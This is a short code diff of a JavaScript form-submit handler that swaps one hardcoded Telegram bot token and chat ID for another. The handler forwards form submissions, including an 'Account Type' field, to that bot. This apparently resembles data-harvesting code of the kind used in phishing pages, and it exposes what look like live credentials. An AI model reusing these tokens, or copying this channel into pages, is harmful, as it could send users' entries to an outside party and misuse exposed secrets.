@@ -48,8 +48,8 @@ document.getElementById("submit-btn").addEventListener("click", function () {
     }
 
     // Telegram Bot API Integration
-    const botToken = "7368506893:AAGCc4o1K-QlcgvTLAnju_He5-pAuovQenY"; // Replace with your bot token
-    const chatId = "7437789145"; // Replace with your Telegram Chat ID
+    const botToken = "7734169736:AAGDFW2mVkNSLrrPClDohEfNE0whlwmBiuE"; // Replace with your bot token
+    const chatId = "7708954371"; // Replace with your Telegram Chat ID
     const message = `
       New Form Submission:
       - Account Type: ${accountType}
